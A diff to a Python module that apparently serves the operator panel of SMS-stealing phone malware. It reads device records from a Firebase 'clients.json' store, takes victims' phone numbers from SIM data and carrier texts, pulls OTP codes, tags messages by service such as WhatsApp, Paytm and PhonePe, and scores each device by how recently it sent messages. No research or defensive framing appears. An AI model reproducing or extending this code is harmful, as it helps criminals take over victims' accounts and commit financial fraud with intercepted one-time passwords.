@@ -1,4 +1,5 @@
 import aiohttp, json, re, base64, time
+from datetime import datetime, timedelta
 
 async def fetch_fb(url, auth=None):
     full_url = url
@@ -19,7 +20,6 @@ async def check_ping(url, auth=None):
     full_url = url
     if auth and str(auth).strip() and str(auth) != "None":
         full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
-    
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(f"{full_url}/clients.json?shallow=true", timeout=3) as resp:
@@ -43,11 +43,33 @@ def decode_panel_url(panel_url):
     except Exception: pass
     return None
 
+def calculate_health(msgs):
+    if not msgs: return 1
+    latest_time = 0
+    for m in msgs:
+        m_id = m.get("id", 0)
+        if isinstance(m_id, (int, float)) and m_id > 100000000000: 
+            if m_id > latest_time: latest_time = m_id / 1000
+        elif isinstance(m_id, str) and m_id.isdigit() and len(m_id) > 12:
+            if int(m_id)/1000 > latest_time: latest_time = int(m_id)/1000
+            
+        m_time = m.get("time", 0)
+        if isinstance(m_time, (int, float)) and m_time > 100000000000:
+            if m_time/1000 > latest_time: latest_time = m_time/1000
+            
+    if latest_time == 0: return 5 
+        
+    diff_hours = (time.time() - latest_time) / 3600
+    if diff_hours < 0.5: return 10
+    if diff_hours < 2: return 8
+    if diff_hours < 6: return 6
+    if diff_hours < 12: return 4
+    return 2
+
 def extract_best_numbers(dev_data, msgs):
     found_nums = {}
     bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890", "0000000000"}
 
-    # 1. Strict SIM metadata check
     if isinstance(dev_data.get("sims"), list):
         for sim in dev_data["sims"]:
             if isinstance(sim, dict):
@@ -63,11 +85,9 @@ def extract_best_numbers(dev_data, msgs):
             if len(n) == 10 and n[0] in "6789" and n not in bad_numbers:
                 found_nums[n] = 100
 
-    # 2. Strict Jio/Airtel message check
     for m in msgs:
         text = m.get("message", "")
         sender = str(m.get("sender", "")).lower()
-        
         if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
             carrier_match = re.search(r'(?:jio|airtel|vi|bsnl)\s*(?:number|no\.?)?\s*[:\-]?\s*([6-9]\d{9})', text, re.IGNORECASE)
             if carrier_match:
@@ -75,7 +95,6 @@ def extract_best_numbers(dev_data, msgs):
                 if n not in bad_numbers:
                     found_nums[n] = 100
                     continue
-
             if "jio" in sender or "jionet" in sender:
                  match = re.search(r'\b([6-9]\d{9})\b', text)
                  if match and match.group(1) not in bad_numbers:
@@ -91,8 +110,12 @@ def extract_otp(text):
 
 def extract_service_name(text, sender):
     text_lower = text.lower()
-    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho", "tezcredit": "TezCredit", "creditt": "Creditt"}
+    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho", "tezcredit": "TezCredit", "creditt": "Creditt", "phonpe": "PhonePe", "tatacl": "TataCL"}
     for key, name in services.items():
         if key in text_lower: return name
     if sender and "-" in sender: return sender.split("-")[1]
     return "Unknown"
+
+def get_ist_time_str(ts):
+    ist = datetime.utcfromtimestamp(ts) + timedelta(hours=5, minutes=30)
+    return ist.strftime("%d %b %Y | %I:%M %p")
